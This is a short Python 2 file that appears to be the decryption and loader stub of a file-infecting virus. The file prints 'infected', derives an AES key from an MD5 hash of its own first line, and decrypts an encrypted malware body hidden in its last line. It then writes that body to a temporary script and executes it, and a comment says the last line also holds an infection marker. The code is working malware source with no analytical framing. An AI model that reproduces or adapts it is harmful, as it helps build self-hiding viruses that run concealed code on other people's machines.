print 'infected'


import os
import hashlib
from Crypto.Cipher import AES
import tempfile

#the decryption routine
def ac967cc41b6d3355007404c7bd25f60c4():
	current_file_name = os.path.basename(__file__)
	#open this infected file
	with open(current_file_name,'r+w') as this:
		lines = this.readlines()
		# get key = hash(first line of this file)
		key = hashlib.md5(lines[0]).digest()
		iv = hashlib.md5(key).digest()

		cipher = AES.new(key, 1, iv)
		
		#get encrypted body from the last line		
		encrypted_body = lines[-1]
		#last line contains encrypted body and infection code
		#used for over infection check
		body = cipher.decrypt(encrypted_body[1:-34].decode('hex'))

		#create temporary file with the malware's main body
		tmp = tempfile.NamedTemporaryFile(mode='w',suffix='.py',delete=True)
		tmp.write(body)
		tmp.flush()
		#execute the main body
		#wiht a proper environment so that __file__ = tmp.name
		execfile(tmp.name, {"__file__" : tmp.name})
		tmp.close()
ac967cc41b6d3355007404c7bd25f60c4()

#ae56dec1d7aed.....
